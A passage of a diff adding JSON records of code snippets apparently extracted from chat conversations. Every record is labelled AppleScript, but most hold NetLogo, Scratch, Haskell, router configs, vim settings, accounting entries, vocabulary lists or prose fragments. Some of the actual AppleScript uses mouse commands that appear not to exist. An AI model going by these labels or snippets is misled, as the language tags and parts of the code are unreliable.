+    "code": "globals [\n  radar-distance        ; 雷达探测范围\n  enemy-detected        ; 是否探测到敌人\n]\n\nturtles-own [\n  enemy-x               ; 敌人的x坐标\n  enemy-y               ; 敌人的y坐标\n]\n\nto setup\n  clear-all\n  create-turtles 1 [\n    setxy 0 0          ; 将飞机放置在原点\n    set radar-distance 10\n    set enemy-detected false\n  ]\n  create-turtles 1 [\n    set enemy-x random 20 - 10 ; 随机生成敌人的x坐标（范围为-10到10）\n    set enemy-y random 20 - 10 ; 随机生成敌人的y坐标（范围为-10到10）\n  ]\n  reset-ticks\nend\n\nto go\n  ask turtles [\n    set enemy-detected false   ; 重置敌人探测状态为未探测到\n    let nearest-enemy min-one-of other turtles [distance myself] ; 获取最近的敌人\n    \n    if distance nearest-enemy <= radar-distance [\n      set enemy-detected true  ; 如果最近的敌人在雷达探测范围内，将敌人探测状态设为已探测到\n      set enemy-x [xcor] of nearest-enemy  ; 获取敌人的x坐标\n      set enemy-y [ycor] of nearest-enemy  ; 获取敌人的y坐标\n    ]\n  ]\n  tick\nend",
+    "filename": "02b39ccb62182ed890df0c9c934e6a08_1.applescript"
+  },
+  {
+    "conversation_hash": "5894cbb30ef36ffce1116ea3599d0db0",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "input num\nif num % 2 = 0 then\n    output \"偶数\"\nelse\n    output \"奇数\"",
+    "filename": "5894cbb30ef36ffce1116ea3599d0db0_1.applescript"
+  },
+  {
+    "conversation_hash": "5894cbb30ef36ffce1116ea3599d0db0",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "to find-enemy\n    ; 获取敌人的位置\n    set enemy-position nearest-agent enemy\n    \n    ; 如果敌人存在\n    if enemy-position != nobody [\n        ; 计算与敌人的距离\n        let distance distance enemy-position\n        \n        ; 如果距离小于视野范围\n        if distance < vision-range [\n            ; 转向敌人\n            turn-towards enemy-position\n            \n            ; 移动向前\n            forward movement-speed\n        ]\n    ]\nend",
+    "filename": "5894cbb30ef36ffce1116ea3599d0db0_4.applescript"
+  },
+  {
+    "conversation_hash": "578f1bbc4a5a82700f811ffe92094305",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": ") to enclose the string inside the `innerHTML` assignment statement. Backticks are used to define template literals, which allow for easy multiline strings and string interpolation. However, it seems that the chat platform you are using does not support backticks for template literals, resulting in the syntax error.\n\nTo fix the error, we replaced the backticks with single quotes (`'`) to define a regular string literal, which is widely supported in most programming languages and environments.\n\nBy using single quotes instead of backticks in the assignment statement:",
+    "filename": "578f1bbc4a5a82700f811ffe92094305_1.applescript"
+  },
+  {
+    "conversation_hash": "24c87cc92e802b64fb70b1c6926408b1",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [
+      "English",
+      "Spain"
+    ],
+    "code": "Spanish Sentence (with Infinitive),English Translation\n\"Yo soy estudiante (ser)\",I am a student\n\"Tú eres inteligente (ser)\",You are intelligent\n\"Él es doctor (ser)\",He is a doctor\n...\n\"Yo voy al cine (ir)\",I go to the cinema\n...\n\"Yo estoy cansado (estar)\",I am tired\n...\n\"Yo tengo un perro (tener)\",I have a dog\n...\n\"Yo hago ejercicio (hacer)\",I do exercise\n...\n\"Yo digo la verdad (decir)\",I tell the truth\n...\n\"Yo vengo de España (venir)\",I come from Spain\n...\n\"Yo puedo nadar (poder)\",I can swim\n...\n\"Yo sé la respuesta (saber)\",I know the answer\n...\n\"Yo quiero comer pizza (querer)\",I want to eat pizza\n...\n\"Yo doy regalos en Navidad (dar)\",I give gifts at Christmas\n...\n\"Yo veo una película en el cine (ver)\",I watch a movie at the cinema\n...\n\"Yo sé la respuesta (saber)\",I know the answer\n...\n\"Yo quepo en la silla (caber)\",I fit in the chair\n...\n\"Yo traduzco textos del inglés al español (traducir)\",I translate texts from English to Spanish\n...\n\"Yo conduzco un coche rápido (conducir)\",I drive a fast car\n...\n\"Yo oigo música en mi habitación (oír)\",I hear music in my room\n...\n\"Yo sigo las instrucciones (seguir)\",I follow the instructions\n...\n\"Yo duermo ocho horas cada noche (dormir)\",I sleep eight hours every night\n...\n\"Yo pido ayuda cuando la necesito (pedir)\",I ask for help when I need it\n...",
+    "filename": "24c87cc92e802b64fb70b1c6926408b1_1.applescript"
+  },
+  {
+    "conversation_hash": "c5c206038db59cce053536381c6a1b50",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [
+      "the",
+      "vertex"
+    ],
+    "code": "The shortest distances from the starting vertex to all other vertices are:\nDistance from vertex 0 to vertex 0: 0\nDistance from vertex 0 to vertex 1: 3\nDistance from vertex 0 to vertex 2: 2\nDistance from vertex 0 to vertex 3: 7\nDistance from vertex 0 to vertex 4: 9",
+    "filename": "c5c206038db59cce053536381c6a1b50_1.applescript"
+  },
+  {
+    "conversation_hash": "f7be6964a7b258d8707e80060ba55eb1",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n  configure terminal\n  vlan 10\n  name ComputerLabs\n  vlan 20\n  name Classrooms\n  ...\n  interface FastEthernet0/1\n  switchport mode access\n  switchport access vlan 10\n  ...",
+    "filename": "f7be6964a7b258d8707e80060ba55eb1_1.applescript"
+  },
+  {
+    "conversation_hash": "f7be6964a7b258d8707e80060ba55eb1",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "enable\n  configure terminal\n  interface GigabitEthernet0/0\n  ip address 192.168.0.2 255.255.255.252\n  ...\n  interface GigabitEthernet0/1\n  ip address 192.168.1.1 255.255.255.0\n  ...\n  ip dhcp pool lab-pool\n  network 192.168.1.0 255.255.255.0\n  default-router 192.168.1.1\n  ...",
+    "filename": "f7be6964a7b258d8707e80060ba55eb1_2.applescript"
+  },
+  {
+    "conversation_hash": "9fa854a29ad62f025add3227fd7ca8ec",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Euclid(a, b)\n입력: 정수 a, b; 단, a ≥ b ≥ 0\n출력: 최대공약수(a, b)\n\n1. if b == 0, return a\n2. return Euclid(b, a mod b)",
+    "filename": "9fa854a29ad62f025add3227fd7ca8ec_2.applescript"
+  },
+  {
+    "conversation_hash": "5ae77a6ac2fd4e16eb02390b240357e0",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset x to 0\nset y to -140\n\nwhen flag clicked\nforever\n  glide 1 sec. to [mouse-pointer v]\n  if touching [enemy v] then\n    broadcast [game over v]\n    hide\n  end\nend\n\nwhen [space v] key pressed\ncreate clone of [bullet v]",
+    "filename": "5ae77a6ac2fd4e16eb02390b240357e0_0.applescript"
+  },
+  {
+    "conversation_hash": "839fa42dd8b0bc94d4539a13aff6dc36",
+    "code_index": 11,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "This command will map port 7860 of the container to port 7860 on your local machine.\n\n### Access the Application\n\nOpen your web browser and navigate to:",
+    "filename": "839fa42dd8b0bc94d4539a13aff6dc36_11.applescript"
+  },
+  {
+    "conversation_hash": "69df686528ddc59b58b489a682e02a2b",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "流程开始 --> 进入巡查办理界面 --> 填写巡查信息 --> 执行其他任务 --> 需要离开巡查办理界面 --> 点击“暂存数据”按钮 --> 保存已填写内容 --> 离开界面\n如果需要再次进入巡查办理界面\n└───是───读取上次暂存的表单数据 --> 自动填入表单 --> 继续填写巡查信息\n└───否───重新填写巡查信息 --> 完成巡查办理\n流程结束",
+    "filename": "69df686528ddc59b58b489a682e02a2b_0.applescript"
+  },
+  {
+    "conversation_hash": "69df686528ddc59b58b489a682e02a2b",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "流程开始 --> 进入巡查办理界面 --> 开始填写巡查信息 --> 出现急事或身体状况不佳等情况需要调休\n└───是───点击\"拆分工单\"按钮 --> 进入拆分工单页面\n         └───选择需要拆分的工单 --> 确认拆分\n                 └───分配拆分后的工单给其他成员 --> 提醒其他成员完成巡查\n└───否───继续填写巡查信息\n流程结束",
+    "filename": "69df686528ddc59b58b489a682e02a2b_1.applescript"
+  },
+  {
+    "conversation_hash": "110a9082d5c6917a4248b2684fa750f4",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Reading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nThe following NEW packages will be installed:\n  bastet\n0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 0 B/34.7 kB of archives.\nAfter this operation, 102 kB of additional disk space will be used.\nSelecting previously unselected package bastet.\n(Reading database ... 273612 files and directories currently installed.)\nPreparing to unpack .../bastet_0.43-4_amd64.deb ...\nUnpacking bastet (0.43-4) ...\nSetting up bastet (0.43-4) ...\nProcessing triggers for man-db (2.8.5-2) ...",
+    "filename": "110a9082d5c6917a4248b2684fa750f4_6.applescript"
+  },
+  {
+    "conversation_hash": "110a9082d5c6917a4248b2684fa750f4",
+    "code_index": 12,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Reading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nThe following NEW packages will be installed:\n  2048\n0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 0 B/25.6 kB of archives.\nAfter this operation, 70 kB of additional disk space will be used.\nSelecting previously unselected package 2048.\n(Reading database ... 273616 files and directories currently installed.)\nPreparing to unpack .../2048_0.9.1-2_amd64.deb ...\nUnpacking 2048 (0.9.1-2) ...\nSetting up 2048 (0.9.1-2) ...\nProcessing triggers for man-db (2.8.5-2) ...",
+    "filename": "110a9082d5c6917a4248b2684fa750f4_12.applescript"
+  },
+  {
+    "conversation_hash": "e5991f766753df333c0523d58e42fb46",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Reading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nNote, selecting 'libsdl1.2debian' instead of 'libsdl1.2'\nlibsdl-image1.2 is already the newest version (1.2.12-5+b5).\nlibsdl-image1.2 set to manually installed.\nlibsdl-ttf2.0-0 is already the newest version (2.0.11-4).\nlibsdl-ttf2.0-0 set to manually installed.\nlibgtk2.0-0 is already the newest version (2.24.32-3ubuntu1).\nlibgtk2.0-0 set to manually installed.\nlibopenal1 is already the newest version (1:1.19.1-1).\nlibopenal1 set to manually installed.\nlibsndfile1 is already the newest version (1.0.28-7).\nlibsndfile1 set to manually installed.\nlibncursesw5 is already the newest version (6.2-0ubuntu2).\nlibncursesw5 set to manually installed.\nlibsdl1.2debian is already the newest version (1.2.15+dfsg2-4).\n0 upgraded, 0 newly installed, 0 to remove and 23 not upgraded.",
+    "filename": "e5991f766753df333c0523d58e42fb46_3.applescript"
+  },
+  {
+    "conversation_hash": "9f0148db0c59841c0923c077ecd61909",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Events\"\n    set mousePos to position of mouse  -- 获取鼠标的位置\n    set xCoord to item 1 of mousePos\n    set yCoord to item 2 of mousePos\n    display dialog \"当前鼠标坐标为：X = \" & xCoord & \", Y = \" & yCoord\nend tell",
+    "filename": "9f0148db0c59841c0923c077ecd61909_0.applescript"
+  },
+  {
+    "conversation_hash": "9f0148db0c59841c0923c077ecd61909",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Events\"\n    set mousePos to position of mouse -- 获取鼠标的位置\n    set xCoord to item 1 of mousePos\n    set yCoord to item 2 of mousePos\n    \n    -- 点击鼠标\n    click at {xCoord, yCoord}\nend tell",
+    "filename": "9f0148db0c59841c0923c077ecd61909_1.applescript"
+  },
+  {
+    "conversation_hash": "9f0148db0c59841c0923c077ecd61909",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Events\"\n    set mousePos to position of mouse -- 获取鼠标的位置\n    set xCoord to item 1 of mousePos\n    set yCoord to item 2 of mousePos\n    \n    -- 模拟鼠标点击\n    tell process \"System Events\"\n        click at {xCoord, yCoord} -- 鼠标左键点击\n    end tell\nend tell",
+    "filename": "9f0148db0c59841c0923c077ecd61909_2.applescript"
+  },
+  {
+    "conversation_hash": "ba1df5660c871e93964d95d033b3759f",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Events\"\n    -- 获取当前鼠标坐标\n    set mousePos to get position of mouse\n    \n    -- 点击鼠标左键\n    click mousePos with button 1\nend tell",
+    "filename": "ba1df5660c871e93964d95d033b3759f_0.applescript"
+  },
+  {
+    "conversation_hash": "b36fd270fce0bdd27aaeec2d863bf239",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- 使用AppleScript获取当前鼠标坐标\ntell application \"System Events\"\n    set mouse_pos to position of the mouse\nend tell\nset x_pos to item 1 of mouse_pos\nset y_pos to item 2 of mouse_pos\n\n-- 使用AppleScript模拟鼠标点击\ntell application \"System Events\"\n    -- 移动鼠标到指定位置\n    set mouse_pos to {x_pos, y_pos}\n    tell process \"SystemUIServer\"\n        click at mouse_pos\n    end tell\nend tell",
+    "filename": "b36fd270fce0bdd27aaeec2d863bf239_0.applescript"
+  },
+  {
+    "conversation_hash": "b36fd270fce0bdd27aaeec2d863bf239",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- 使用AppleScript和Objective-C混合代码获取当前鼠标位置\nset objcScript to \"\n    set mousePos to current application's NSEvent's mouseLocation() -- 获取当前鼠标位置\n    return {item 1 of mousePos, item 2 of mousePos}\n\"\n\n-- 运行Objective-C代码并获取鼠标位置\nset mousePos to do shell script \"/usr/bin/osascript -e \" & quoted form of objcScript\n\n-- 解析鼠标位置\nset {mouseX, mouseY} to paragraphs of mousePos\n\n-- 使用AppleScript模拟鼠标左键点击\ntell application \"System Events\"\n    tell process \"SystemUIServer\"\n        click at {mouseX, mouseY}\n    end tell\nend tell",
+    "filename": "b36fd270fce0bdd27aaeec2d863bf239_1.applescript"
+  },
+  {
+    "conversation_hash": "bf0b111efc9cca2324382dc7a71c688e",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Events\"\n    tell process \"SystemUIServer\"\n        set mousePos to the position of the mouse\n    end tell\nend tell",
+    "filename": "bf0b111efc9cca2324382dc7a71c688e_2.applescript"
+  },
+  {
+    "conversation_hash": "1167d6ccb684ed258c2e58ae1d5d8870",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "o o o o o\no 1 5 1 o\no 3 7 2 o\no 1 4 9 o\no o o o o",
+    "filename": "1167d6ccb684ed258c2e58ae1d5d8870_0.applescript"
+  },
+  {
+    "conversation_hash": "1167d6ccb684ed258c2e58ae1d5d8870",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "o o o o o\no 1 5 1 o\no 3 7 2 o\no 1 4 9 o\no o o o o",
+    "filename": "1167d6ccb684ed258c2e58ae1d5d8870_3.applescript"
+  },
+  {
+    "conversation_hash": "1167d6ccb684ed258c2e58ae1d5d8870",
+    "code_index": 12,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Padded 𝐼:\no o o o o\no 1 5 1 o\no 3 7 2 o\no 1 4 9 o\no o o o o",
+    "filename": "1167d6ccb684ed258c2e58ae1d5d8870_12.applescript"
+  },
+  {
+    "conversation_hash": "dbefbb09a2aa62bd89d288a8cdcdd35b",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "보조기억장치 (Secondary Storage)\n├─ 기계적 저장 매체 (Mechanical Storage Devices)\n│  ├─ 회전식 자기 저장 매체 (Rotating Magnetic Storage)\n│  │  ├─ 하드 디스크 드라이브 (HDD)\n│  │  └─ 플로피 디스크 (Floppy Disk)\n│  └─ 광학 저장 매체 (Optical Storage)\n│     ├─ CD (Compact Disc)\n│     ├─ DVD (Digital Versatile Disc)\n│     └─ Blu-ray Disc\n├─ 자기 저장 매체 (Magnetic Storage)\n│  └─ 자기 테이프 (Magnetic Tape)\n└─ 반도체 저장 매체 (Semiconductor Storage Devices)\n   ├─ 플래시 메모리 기반 저장 매체 (Flash Memory-based Storage)\n   │  ├─ 솔리드 스테이트 드라이브 (SSD)\n   │  ├─ USB 플래시 드라이브 (USB Flash Drive)\n   │  └─ 메모리 카드 (Memory Card)\n   │     ├─ SD 카드 (SD Card)\n   │     ├─ microSD 카드 (microSD Card)\n   │     └─ CompactFlash 카드 (CompactFlash Card)\n   └─ 전자 저장 매체 (Electronic Storage)\n      └─ EEPROM (Electrically Erasable Programmable Read-Only Memory)",
+    "filename": "dbefbb09a2aa62bd89d288a8cdcdd35b_1.applescript"
+  },
+  {
+    "conversation_hash": "dbefbb09a2aa62bd89d288a8cdcdd35b",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "보조기억장치 (Secondary Storage)\n├─ 기계적 저장 매체 (Mechanical Storage Devices)\n│ └─ 회전식 자기 저장 매체 (Rotating Magnetic Storage)\n│ │ ├─ 하드 디스크 드라이브 (HDD)\n│ │ └─ 플로피 디스크 (Floppy Disk)\n│ └─ 광학 저장 매체 (Optical Storage)\n│ ├─ CD (Compact Disc)\n│ ├─ DVD (Digital Versatile Disc)\n│ └─ Blu-ray Disc\n├─ 자기 저장 매체 (Magnetic Storage)\n│ └─ 자기 테이프 (Magnetic Tape)\n└─ 반도체 저장 매체 (Semiconductor Storage Devices)\n├─ 플래시 메모리 기반 저장 매체 (Flash Memory-based Storage)\n│ ├─ 솔리드 스테이트 드라이브 (SSD)\n│ ├─ USB 플래시 드라이브 (USB Flash Drive)\n│ └─ 메모리 카드 (Memory Card)\n│ ├─ SD 카드 (SD Card)\n│ ├─ microSD 카드 (microSD Card)\n│ └─ CompactFlash 카드 (CompactFlash Card)\n├─ 비휘발성 메모리 (Non-Volatile Memory)\n│ ├─ Mask ROM\n│ ├─ 프로그래머블 ROM (Programmable ROM)\n│ │ ├─ PROM (Programmable Read-Only Memory)\n│ │ ├─ EPROM (Erasable Programmable Read-Only Memory)\n│ │ └─ EEPROM (Electrically Erasable Programmable Read-Only Memory)\n│ └─ 펌웨어 기억 장치 (Firmware Storage Devices)\n│ └─ BIOS 칩\n└─ 휘발성 메모리 (Volatile Memory)\n├─ DRAM (Dynamic Random-Access Memory)\n└─ SRAM (Static Random-Access Memory)",
+    "filename": "dbefbb09a2aa62bd89d288a8cdcdd35b_2.applescript"
+  },
+  {
+    "conversation_hash": "cc8958b79caf1194245bda26f93ecfa1",
+    "code_index": 2,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset [y-velocity v] to [0]\nforever\n    change y by (y-velocity)\n    set [y-velocity v] to ((y-velocity) - (1)) // Gravity effect\n    if (touching [ground v]?)\n        set [y-velocity v] to [0] // Stop falling when touching the ground\n    if ((key (up arrow) pressed) and (touching [ground v]?))\n        set [y-velocity v] to [10] // Jumping force",
+    "filename": "cc8958b79caf1194245bda26f93ecfa1_2.applescript"
+  },
+  {
+    "conversation_hash": "cc8958b79caf1194245bda26f93ecfa1",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "// Example code to stop falling when landing on a platform\nwhen green flag clicked\nforever\n    if (touching [Platform v]? and (y-velocity < [0]))\n        set [y-velocity v] to [0]\n        // Additional code might be necessary to reposition the sprite on the platform\n    end",
+    "filename": "cc8958b79caf1194245bda26f93ecfa1_3.applescript"
+  },
+  {
+    "conversation_hash": "cc8958b79caf1194245bda26f93ecfa1",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "when green flag clicked\nset [speed v] to [2] // This is the speed of the enemy's movement\nset [left boundary v] to [x position of the left edge of movement]\nset [right boundary v] to [x position of the right edge of movement]\nset [direction v] to [1] // 1 for moving right, -1 for moving left\nforever\n    move (speed) steps\n    if <(x position) > (right boundary)> then\n        set [direction v] to [-1]\n    end\n    if <(x position) < (left boundary)> then\n        set [direction v] to [1]\n    end\n    set [speed v] to ((speed) * (direction)) // This inverts the speed to change direction\nend",
+    "filename": "cc8958b79caf1194245bda26f93ecfa1_4.applescript"
+  },
+  {
+    "conversation_hash": "9ae269c0e7c798776b4e6f68f8440337",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "tell application \"System Events\"\n    set currentMousePosition to mouse location -- 获取当前鼠标位置\n    -- 输出鼠标位置\n    display dialog \"鼠标当前位置：\" & (currentMousePosition as text)\n    -- 执行鼠标点击\n    do shell script \"cliclick c:\" & (item 1 of currentMousePosition as text) & \",\" & (item 2 of currentMousePosition as text)\nend tell",
+    "filename": "9ae269c0e7c798776b4e6f68f8440337_0.applescript"
+  },
+  {
+    "conversation_hash": "2b0c0b5348ef18ae2ae76c4993dabb78",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "-- Journal d'opérations --\nDate: 01/10/N\n101 Capital (Débit)                            150 000 €\n512 Banque (Crédit)                            150 000 €\nLibellé: Apport personnel de Mr. Durand virement n°57\n\nDate: 03/10/N\n53 Caisse (Débit)                                6 000 €\n512 Banque (Crédit)                              6 000 €\nLibellé: Retrait bancaire pour caisse bordereau n°983\n\nDate: 05/10/N\n2182 Matériel de transport (Débit)               65 000 €\n512 Banque (Crédit)                              65 000 €\nLibellé: Acquisition de véhicules facture F43, chèque n°143\n\nDate: 06/10/N\n2183 Matériels informatiques (Débit)              5 300 €\n205 Logiciels (Débit)                             3 700 €\n401 Fournisseurs (Crédit)                        9 000 €\n512 Banque (Crédit)                              5 300 €\nLibellé: Achat matériels et logiciels facture n°578, chèque n°144 et crédit fournisseur\n\nDate: 07/10/N\n164 Emprunts (Débit)                            10 000 €\n512 Banque (Crédit)                            10 000 €\nLibellé: Emprunt bancaire\n\nDate: 08/10/N\n401 Fournisseurs (Débit)                         2 000 €\n771 Produits financiers (Crédit)                 2 000 €\nLibellé: Réduction de AMS Informatique facture d'avoir n°12 et remboursement par chèque bancaire n°998\n\nDate: 09/10/N\n6064 Fournitures de bureau (Débit)               1 000 €\n401 Fournisseurs (Crédit)                        1 000 €\nLibellé: Achat à crédit fourniture bureau facture n°32 Papeterie Gerbert\n\nDate: 09/10/N\n2184 Matériel de bureau (Débit)                    600 €\n512 Banque (Crédit)                                600 €\nLibellé: Achat imprimante et photocopieur facture n°854, chèque n°145\n\nDate: 10/10/N\n401 Fournisseurs (Débit)                           200 €\n609 Rabais, remises et ristournes obtenus (Crédit) 200 €\nLibellé: Facture d'avoir n° AV32 de Papeterie Gerbert\n\nDate: 15/10/N\n53 Caisse (Débit)                                2 250 €\n706 Prestations de services (Crédit)             2 250 €\nLibellé: Recettes première quinzaine\n\nDate: 17/10/N\n635 Autres impôts, taxes et versements assimilés (Débit)     750 €\n512 Banque (Crédit)                                          750 €\nLibellé: Cartes grises chèque n°146\n\nDate: 18/10/N\n616 Primes d'assurances (Débit)                 6 700 €\n512 Banque (Crédit)                             6 700 €\nLibellé: Assurance véhicules contrat n°Z203, chèque n°147\n\nDate: 19/10/N\n623 Publicité (Débit)                             250 €\n53 Caisse (Crédit)                               250 €\nLibellé: Publicité journal locale facture n°103\n\nDate: 20/10/N\n661 Charges d'intérêts (Débit)                    1 500 €\n512 Banque (Crédit)                              1 500 €\nLibellé: Intérêts sur emprunts par prélèvement\n\nDate: 21/10/N\n401 Fournisseurs (Débit)                        5 000 €\n512 Banque (Crédit)                             5 000 €\nLibellé: Paiement AMS Informatique chèque n°148\n\nDate: 24/10/N\n671 Charges exceptionnelles (Débit)                150 €\n53 Caisse (Crédit)                                 150 €\nLibellé: Contraventions stationnement\n\nDate: 28/10/N\n53 Caisse (Débit)                                  100 €\n771 Produits financiers (Crédit)                   100 €\nLibellé: Pourboire reçu, pièce de caisse n°35\n\nDate: 30/10/N\n6063 Carburants (Débit)                          2 300 €\n512 Banque (Crédit)                              2 300 €\nLibellé: Frais d'essence chèque n°149\n\nDate: 31/10/N\n53 Caisse (Débit)                                6 000 €\n512 Banque (Débit)                                 450 €\n706 Prestations de services (Crédit)             6 450 €\nLibellé: Recettes deuxième quinzaine dont 450 € en chèques",
+    "filename": "2b0c0b5348ef18ae2ae76c4993dabb78_0.applescript"
+  },
+  {
+    "conversation_hash": "b3333ffc28506af8caccef10cd3be408",
+    "code_index": 3,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "set laststatus=2\nset statusline=%f          \" Filename on the left\nset statusline+=%<         \" Truncation point after the filename\nset statusline+=%=         \" Split the statusline (left-aligned to left, right-aligned to right)\nset statusline+=%l/%L      \" Current line number / Total lines on the right",
+    "filename": "b3333ffc28506af8caccef10cd3be408_3.applescript"
+  },
+  {
+    "conversation_hash": "b3333ffc28506af8caccef10cd3be408",
+    "code_index": 4,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "set laststatus=2\nset statusline=%f          \" Filename on the left\nset statusline+=%>         \" Set a truncation point for the left items\nset statusline+=%=         \" Equal sign splits the statusline\nset statusline+=%<%l       \" Line number on the right with a truncation point before it",
+    "filename": "b3333ffc28506af8caccef10cd3be408_4.applescript"
+  },
+  {
+    "conversation_hash": "b3333ffc28506af8caccef10cd3be408",
+    "code_index": 6,
+    "language": "AppleScript",
+    "libraries": [
+      "the"
+    ],
+    "code": "set laststatus=2\nset statusline=%f          \" Filename on the left\nset statusline+=%<         \" Indicate truncation from the right side if needed\nset statusline+=%=         \" Separation between left and right sections\nset statusline+=%l         \" Line number on the right",
+    "filename": "b3333ffc28506af8caccef10cd3be408_6.applescript"
+  },
+  {
+    "conversation_hash": "7e2c87ab1fb32876085f015e7b5dd3d8",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "Fly Cages(📦) --🔆--> Egg Collection(🥚) --➖--> Incubation(🐣)\n\n       |\n       V\nVertical Larva Trays(⬛)\n       |\n       V\nAutomated Feeding System(🔄🥬) --🔄--> Waste Prep(♻️🗑️)\n       |                                                    \n       V                                                     \nEnvironmental Control(🌡️💨) --🖥️🔁--> Larvae Harvest(⚙️) --📦",
+    "filename": "7e2c87ab1fb32876085f015e7b5dd3d8_0.applescript"
+  },
+  {
+    "conversation_hash": "3cd58e8f0ae839f5601af39c4f51645b",
+    "code_index": 12,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "fight :: EnemyArmy -> Army -> Army\nfight [] army = army -- No enemies, allies win unharmed\nfight enemies [] = [] -- No allies, return empty list\nfight (enemy:enemies) allies = case enemy of\n    M (Alive mage@(Master _ _ spell)) -> fight enemies (map (applyDamage spell) allies)\n    _ -> fight enemies allies -- If it's not a mage, move to the next unit\n\napplyDamage :: Spell -> Unit -> Unit\napplyDamage spell (E (Alive (Golem h))) = E (Alive (Golem (max 0 (spell h))))\napplyDamage spell (E (Alive (HaskellElemental h))) = E (Alive (HaskellElemental (max 0 (spell h))))\napplyDamage _ unit = unit -- If it's Dead or a Mage, we don't apply the spell",
+    "filename": "3cd58e8f0ae839f5601af39c4f51645b_12.applescript"
+  },
+  {
+    "conversation_hash": "e0d561e9a243279ae9dcfb1bf6a02cd9",
+    "code_index": 0,
+    "language": "AppleScript",
+    "libraries": [],
+    "code": "on open these_items\n\trepeat with this_item in these_items\n\t\ttry\n\t\t\ttell application \"Adobe InDesign 2023\"\n\t\t\t\t-- Check if InDesign is running\n\t\t\t\tif not (exists process \"Adobe InDesign 2023\") then\n\t\t\t\t\tdisplay alert \"Adobe InDesign 2023 is not running.\"\n\t\t\t\t\treturn\n\t\t\t\tend if\n\t\t\t\t\n\t\t\t\tactivate\n\t\t\t\t-- Document Creation\n\t\t\t\tset myDoc to make document\n\t\t\t\t\n\t\t\t\ttell myDoc\n\t\t\t\t\tset horizontal measurement units of view preferences to millimeters\n\t\t\t\t\tset vertical measurement units of view preferences to millimeters\n\t\t\t\t\t\n\t\t\t\t\ttell document preferences of it\n\t\t\t\t\t\tset page height to \"283mm\"\n\t\t\t\t\t\tset page width to \"226mm\"\n\t\t\t\t\t\tset page orientation to portrait\n\t\t\t\t\tend tell\n\t\t\t\t\t\n\t\t\t\t\t-- Import pdf\n\t\t\t\t\ttell page 1 of myDoc\n\t\t\t\t\t\tset myRectangle to make rectangle with properties {geometric bounds:{0, 226, 283, 0}}\n\t\t\t\t\t\t\n\t\t\t\t\t\ttry\n\t\t\t\t\t\t\tset placedObj to place alias (this_item) on myRectangle\n\t\t\t\t\t\t\tfit placedObj given center content\n\t\t\t\t\t\ton error errMsg\n\t\t\t\t\t\t\tdisplay alert \"Error placing PDF file: \" & errMsg\n\t\t\t\t\t\tend try\n\t\t\t\t\tend tell\n\t\t\t\tend tell\n\t\t\tend tell\n\t\ton error errMsg\n\t\t\tdisplay alert \"Error occurred: \" & errMsg\n\t\tend try\n\tend repeat\nend open",
+    "filename": "e0d561e9a243279ae9dcfb1bf6a02cd9_0.applescript"
+  },
+  {
+    "conversation_hash": "e0d561e9a243279ae9dcfb1bf6a02cd9",
+    "code_index": 1,
+    "language": "AppleScript",
+    "libraries": [],
